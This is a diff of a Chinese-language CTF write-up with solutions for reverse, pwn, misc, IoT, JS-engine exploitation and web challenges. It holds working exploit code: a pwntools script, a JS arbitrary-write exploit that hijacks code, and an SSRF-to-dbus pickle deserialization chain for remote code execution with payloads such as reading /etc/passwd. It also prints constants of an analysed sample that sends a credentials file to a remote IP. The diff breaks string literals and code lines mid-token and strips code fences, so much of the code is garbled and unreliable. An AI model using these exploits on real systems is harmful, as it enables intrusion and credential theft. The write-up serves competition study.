@@ -7,13 +7,15 @@
 
 包含闯关赛除rhttpd，unsafevm，domaingogogo外全部题解，以及漏洞挖掘赛1题。
 
- 1. Reverse 
+ 1. Reverse
 
 unsetunset1.1 packpyunsetunset
 
 修改的upx，可以用这个直接修，并且脱壳
 
-python .upxrecoverytool.py -i D:xxxpackpy -o D:xxxpackpy2
+python .upxrecoverytool.py -i D:
+xxxpackpy -o D:
+xxxpackpy2
 
 应该是pyinstaller封的，看看能不能直接一把梭
 
@@ -420,7 +422,7 @@ flag{js3ng1n7lik3m1r0uter!}>>>
 
 flag{js3ng1n7lik3m1r0uter!}
 
- 2. Pwn 
+ 2. Pwn
 
 unsetunset2.1 fshellunsetunset
 
@@ -554,7 +556,7 @@ io.sendline(b"-")
 
 io.interactive()
 
- 3. Misc 
+ 3. Misc
 
 unsetunset3.1 两极反转unsetunset
 
@@ -583,7 +585,8 @@ what.can.i.say
 <EOF>
 '''
 
-r = bytes_to_long(b"""__import__('subprocess').check_output("cp ru*/_r* 1;head -n -5 1 > x.py ; python3 -c 'from x import code;print(code[:-1])' > 2 ; cat 2 1>&2;",shell=True)""")
+r = bytes_to_long(b"""__import__('subprocess').check_output("cp ru*/_r* 1;head -n -5 1 > x.py ; python3 -c 'from x import code;
+print(code[:-1])' > 2 ; cat 2 1>&2;",shell=True)""")
 print(len(hex(r)))
 print(hex(r))
 
@@ -617,7 +620,12 @@ data=d7DxBWeC1sSz5LY3colz2jpYCYgRdwfNFKcy1LIs%2F5RCocrzCD7bN9Do95e8AJvT%2Bxp5YgH
 
 盯着常量猜：
 
-.bytecode������.�d��[�T�D�l����l���l����Z�Zf�������?f�������u�c�a__module__�a__class__�a__name__�a__package__�a__metaclass__�a__abstractmethods__�a__closure__�a__dict__�a__doc__�a__file__�a__path__�a__enter__�a__exit__�a__builtins__�a__all__�a__init__�a__cmp__�a__iter__�a__loader__�a__compiled__�a__nuitka__�ainspect�acompile�arange�aopen�asuper�asum�aformat�a__import__�abytearray�astaticmethod�aclassmethod�akeys�aname�aglobals�alocals�afromlist�alevel�aread�arb�w/wapath�abasename�adirname�aabspath�aisabs�aexists�aisdir�aisfile�alistdir�agetattr�a__cached__�aprint�aend�afile�abytes�w.w_asend�athrow�aclose�asite�atype�alen�arepr�aint�aiter�a__spec__�a_initializing�aparent�atypes�a__main__�a__class_getitem__�areconfigure�aencoding�aline_buffering�afileno�uC:UsersadminAppDataLocalProgramsPythonPython38python.exe�uC:UsersadminAppDataLocalProgramsPythonPython38�.__main__�$��G�ahashlib�amd5�arb�a__enter__�a__exit__�u�uget_file_md5..�c�ahash_md5�aupdate�Tnnnahexdigest�wfaread�Tl���aBS�aAES_SECRET_KEY�akey�aAES�aMODE_CBC�amode�anew�aencode�Tautf8�aIV�aencrypt�apad�autf8�aciphertext�abase64�ab64encode�adecode�Tuutf-8�a__doc__�uC:UsersadminDesktopdemo补丁修复.py�a__file__�a__cached__�a__annotations__�l����arequests�uCrypto.Cipher�TaAES�aget_file_md5�Tu./补丁检测.exe�affe01db6b79092b8�a__main__�a__module__�aAES_ENCRYPT�a__qualname__�a__init__�uAES_ENCRYPT.__init__�uAES_ENCRYPT.encrypt�T�aaes_encrypt�uC:UsersadminDesktop用户名密码.txt�afile�atext�weadata�apost�uhttp://192.168.59.1:8086/data.php�l���Taurl�adata�atimeout�aresponse�aprint�TwfTwsu�Taself�Taself�atext�acryptor�Tafilename�ahash_md5�wfachunk�.�
+.bytecode������.�d��[�T�D�l����l���l����Z�Zf�������?f�������u�c�a__module__�a__class__�a__name__�a__package__�a__metaclass__�a__abstractmethods__�a__closure__�a__dict__�a__doc__�a__file__�a__path__�a__enter__�a__exit__�a__builtins__�a__all__�a__init__�a__cmp__�a__iter__�a__loader__�a__compiled__�a__nuitka__�ainspect�acompile�arange�aopen�asuper�asum�aformat�a__import__�abytearray�astaticmethod�aclassmethod�akeys�aname�aglobals�alocals�afromlist�alevel�aread�arb�w/wapath�abasename�adirname�aabspath�aisabs�aexists�aisdir�aisfile�alistdir�agetattr�a__cached__�aprint�aend�afile�abytes�w.w_asend�athrow�aclose�asite�atype�alen�arepr�aint�aiter�a__spec__�a_initializing�aparent�atypes�a__main__�a__class_getitem__�areconfigure�aencoding�aline_buffering�afileno�uC:
+UsersadminAppDataLocalProgramsPythonPython38python.exe�uC:
+UsersadminAppDataLocalProgramsPythonPython38�.__main__�$��G�ahashlib�amd5�arb�a__enter__�a__exit__�u�uget_file_md5..�c�ahash_md5�aupdate�Tnnnahexdigest�wfaread�Tl���aBS�aAES_SECRET_KEY�akey�aAES�aMODE_CBC�amode�anew�aencode�Tautf8�aIV�aencrypt�apad�autf8�aciphertext�abase64�ab64encode�adecode�Tuutf-8�a__doc__�uC:
+UsersadminDesktopdemo补丁修复.py�a__file__�a__cached__�a__annotations__�l����arequests�uCrypto.Cipher�TaAES�aget_file_md5�Tu./补丁检测.exe�affe01db6b79092b8�a__main__�a__module__�aAES_ENCRYPT�a__qualname__�a__init__�uAES_ENCRYPT.__init__�uAES_ENCRYPT.encrypt�T�aaes_encrypt�uC:
+UsersadminDesktop用户名密码.txt�afile�atext�weadata�apost�uhttp://192.168.59.1:
+8086/data.php�l���Taurl�adata�atimeout�aresponse�aprint�TwfTwsu�Taself�Taself�atext�acryptor�Tafilename�ahash_md5�wfachunk�.�
 
 字节码里的逻辑是 key = get_file_md5(‘补丁检测.exe’)
 
@@ -641,7 +649,7 @@ def main():
 
 main()
 
- 4. IOT 
+ 4. IOT
 
 unsetunset4.1 specialunsetunset
 
@@ -653,7 +661,7 @@ unsetunset4.1 specialunsetunset
 
 flag{0e327444a0ef9a1819c341f396d97b18}
 
- 5. PWN-漏洞挖掘 
+ 5. PWN-漏洞挖掘
 
 unsetunset5.1 optimizerunsetunset
 
@@ -852,7 +860,7 @@ arb_write32(foo_code + 0x18n, Number(jmp_addr >> 32n));
 
 foo();
 
- 6. Web 
+ 6. Web
 
 unsetunset6.1 tantantanunsetunset
 
@@ -862,7 +870,8 @@ index.php
 
 <?php
 header("Content-Security-Policy: default-src 'none';");
-echo "Content-Security-Policy: default-src 'none';<br>";
+echo "Content-Security-Policy: default-src 'none';
+";
 echo "?xss=?";
 if (isset($_GET["xss"])){
      echo $_GET["xss"];
@@ -968,12 +977,9 @@ ssrf dbus 带 key 去打ctf.syncServer，触发反序列化拿到RCE
 
 
 ```
-python .upxrecoverytool.py -i D:xxxpackpy -o D:xxxpackpy2
-```
-
-
-
-```
+python .upxrecoverytool.py -i D:
+xxxpackpy -o D:
+xxxpackpy2
 # Source Generated with Decompyle++
 # File: packpy.pyc (Python 3.8)
 
@@ -988,11 +994,6 @@ try:
 finally:
     pass
 return None
-```
-
-
-
-```
 import base58
 import zlib
 import marshal
@@ -1004,11 +1005,6 @@ HEAD = bytes.fromhex('550D0D0A000000000000000000000000')
 
 with open('wtf.pyc', 'wb') as f:
     f.write(HEAD+a)
-```
-
-
-
-```
 # Source Generated with Decompyle++
 # File: wtf.pyc (Python 3.8)
 
@@ -1038,11 +1034,6 @@ try:
 finally:
     pass
 return None
-```
-
-
-
-```
 # Source Generated with Decompyle++
 # File: wtf.pyc (Python 3.8)
 
@@ -1072,33 +1063,18 @@ for seed_value in range(256):
     key = generate_key(seed_value)
     data = decrypt(encdata, key)
     print(data)
-```
-
-
-
-```
 密文 = [
     223,75,84,137,140,81,0,14,224,207,10,89,135,8,150,111,
     60, 162,243,52,22,180,122,247,164,96,161,215,202,58,
     184,72,236,150,96,199,137,2,73,131,123,227,143,242,
     111,137,65, 87
 ]
-```
-
-
-
-```
 key = [
     78, 200,117,86, 215,190,169,72,184,158,163,199,194,241,60,46
 ]
 keyExpend = [
 20168, 30038, 55230, 43336, 47262, 41927, 49905, 15406, 44463, 32082, 37233, 15687, 36741, 57976, 23709, 37098, 42274, 57978, 36639, 3012, 61625, 15137, 54619, 24314, 62750, 15895, 35297, 29302, 17322, 46781, 62794, 17860, 12051, 49892, 60551, 21869, 31722, 38027, 35306, 15484, 51673, 3754, 56055, 54569, 5907, 54392, 63582, 10117, 21941, 61354, 21038, 10152
 ]
-```
-
-
-
-```
 每次加密8位，8个byte分成4组，每组2bytes，下简称a1234
 8轮：
 t1 = a1 *  keyExpend[i*6 +0]%0x10001
@@ -1124,14 +1100,9 @@ a1 *= keyExpend[12*4+0]%0x10001
 a2 += keyExpend[12*4+1]
 a3 += keyExpend[12*4+2]
 a4 *= keyExpend[12*4+3]%0x10001
-```
-
-
-
-```
 // https://github.com/razvanalex/IDEA-encryption-algorithm
-#include <stdio.h>
-#include <string.h>
+    #include <stdio.h>
+    #include <string.h>
 
 typedef __uint32_t uint32_t;
 typedef __int32_t int32_t;
@@ -1346,27 +1317,12 @@ int main() {
 
   return 0;
 }
-```
-
-
-
-```
 get_var print
         push_atom_value error
         call1 1
-```
-
-
-
-```
 get_var print
         get_var buf
         call1 1
-```
-
-
-
-```
 >>> dest = [118,137,196,160,121,117,55,150,46,174,207,7,210,130,194,153,82,79,213,180,96,251,210,102,78,84,78]
 >>> cipher = [32,213,149,247,50,47,116,149,112,249,206,89,213,222,155,194,81,18,212,246,96,190,150,51,12,69,3]
 >>> src = b'0'*27
@@ -1374,11 +1330,6 @@ get_var print
 ...     print(chr(dest[i]^cipher[i]^src[i]),end='')
 ...
 flag{js3ng1n7lik3m1r0uter!}>>>
-```
-
-
-
-```
 from pwn import *
 
 context.log_level = 'debug'
@@ -1506,11 +1457,6 @@ for an in ans:
 io.sendline(b"-")
 
 io.interactive()
-```
-
-
-
-```
 from Crypto.Util.number import bytes_to_long
 
 code='''
@@ -1524,20 +1470,11 @@ what.can.i.say
 <EOF>
 '''
 
-r = bytes_to_long(b"""__import__('subprocess').check_output("cp ru*/_r* 1;head -n -5 1 > x.py ; python3 -c 'from x import code;print(code[:-1])' > 2 ; cat 2 1>&2;",shell=True)""")
+r = bytes_to_long(b"""__import__('subprocess').check_output("cp ru*/_r* 1;head -n -5 1 > x.py ; python3 -c 'from x import code;
+print(code[:-1])' > 2 ; cat 2 1>&2;",shell=True)""")
 print(len(hex(r)))
 print(hex(r))
-```
-
-
-
-```
 tshark -r attach.pcapng -Y 'usb.capdata and usb.src==2.4.127' -T fields -e usb.capdata > raw
-```
-
-
-
-```
 import hashlib
 from Crypto.Cipher import AES
 import base64
@@ -1555,11 +1492,6 @@ def main():
     print(decrypted)
 
 main()
-```
-
-
-
-```
 let hex = (val) => '0x' + val.toString(16);
 
 function foo() {
@@ -1752,14 +1684,10 @@ arb_write32(foo_code + 0x14n, Number(jmp_addr & 0xffffffffn));
 arb_write32(foo_code + 0x18n, Number(jmp_addr >> 32n));
 
 foo();
-```
-
-
-
-```
 <?php
 header("Content-Security-Policy: default-src 'none';");
-echo "Content-Security-Policy: default-src 'none';<br>";
+echo "Content-Security-Policy: default-src 'none';
+";
 echo "?xss=?";
 if (isset($_GET["xss"])){
      echo $_GET["xss"];
@@ -1769,11 +1697,6 @@ else {
     echo "速度来跳舞";
 }
 ?>
-```
-
-
-
-```
 <?php
 error_reporting(0);
 // error_reporting(E_ALL & ~E_WARNING);
@@ -1786,11 +1709,6 @@ $result=curl_exec($ch);
 curl_close($ch);
 echo ($result);
 ?>
-```
-
-
-
-```
 from flask import Flask,Response, request
 
 app = Flask(__name__)
@@ -1816,17 +1734,7 @@ def readfile():
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=80)
-```
-
-
-
-```
 cmd=cat+/etc/passwd
-```
-
-
-
-```
 @dbus.service.method("ctf.syncServer", in_signature='ss', out_signature='s')
     def backdoor(self, username, key):
         global secretKey
@@ -1834,19 +1742,9 @@ cmd=cat+/etc/passwd
             data = pickle.loads(base64.b64decode(loginList[username]))
             return str(data)
         return "keyError"
-```
-
-
-
-```
 @dbus.service.method("ctf.flag.service", in_signature='s', out_signature='s')
     def getTime(self, format):
         return __import__("json").dumps({"code": 1, "time": time.strftime(format, time.localtime())})
-```
-
-
-
-```
 import pickle
 import base64
 import hashlib
@@ -1890,7 +1788,8 @@ def get_unix_time(session):
 
 # 获取 code
 def get_code(session):
-    burp0_data = {"cmd": "curl", "method": "GET", "url": "http://127.0.0.1:8080/getCode"}
+    burp0_data = {"cmd": "curl", "method": "GET", "url": "http://127.0.0.1:
+8080/getCode"}
     r = session.post(burp0_url, headers=burp0_headers, data=burp0_data)
     c2 = ""
     for line in r.text.split("n"):
@@ -1918,7 +1817,8 @@ def unix_dbus(session, secretKey):
     burp0_data = {"cmd": "curl",
                   "method": unix_sockets,
                   "data": "",
-                  "url": "http://127.0.0.1:8080/getCode",
+                  "url": "http://127.0.0.1:
+8080/getCode",
                   "tcpstr": "unix:///var/run/dbus/system_bus_socket"}
     r = session.post(burp0_url, headers=burp0_headers, data=burp0_data)
     print(r.text)
@@ -1927,7 +1827,8 @@ def unix_dbus(session, secretKey):
 # 登陆并重置 secret
 def login(session, code, cookie_token, pickle_data):
     login_text = f"""GET /login?username=admin&password=123456&code={code} HTTP/1.1
-Host: 127.0.0.1:8080
+Host: 127.0.0.1:
+8080
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
 Accept-Encoding: gzip, deflate, br
 Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
@@ -1944,7 +1845,8 @@ GET"""
 
     burp0_data = {"cmd": "curl",
                   "method": login_text,
-                  "url": "127.0.0.1:8080"}
+                  "url": "127.0.0.1:
+8080"}
 
     r = session.post(burp0_url, headers=burp0_headers, data=burp0_data)
     print(r)
@@ -1952,7 +1854,8 @@ GET"""
 
     burp0_data = {"cmd": "curl",
                   "method": login_text.replace("123456", "123455"),
-                  "url": "127.0.0.1:8080"}
+                  "url": "127.0.0.1:
+8080"}
     for i in range(6):
         r = session.post(burp0_url, headers=burp0_headers, data=burp0_data)
 
@@ -1974,7 +1877,8 @@ def read_rtc_time(session):
         try:
             rtc_datetime = datetime.strptime(rtc_datetime_str, "%Y-%m-%d %H:%M:%S")
             return rtc_datetime
-        except ValueError as e:
+        
+except ValueError as e:
             raise ValueError(f"Error parsing datetime: {e}")
     else:
         raise ValueError("Could not read RTC time and date from /proc/driver/rtc")
@@ -2033,11 +1937,6 @@ except ValueError as e:
 
 r = requests.post('http://web-4a21d0c15d.challenge.xctf.org.cn/', data={'cmd': 'cat /tmp/1'})
 print(r.text)
-```
-
-
-
-```
 # echo aW1wb3J0IG9zCgpvcy5zeXN0ZW0oImNobW9kIDc3NyAvZmxhZyIp | base64 -d > /app/json.py ; cat /app/json.py > /tmp/1
 # dbus-send --system --print-reply --dest=ctf.flag.service /ctf/flag/service ctf.flag.service.getTime string:"1"
 ```
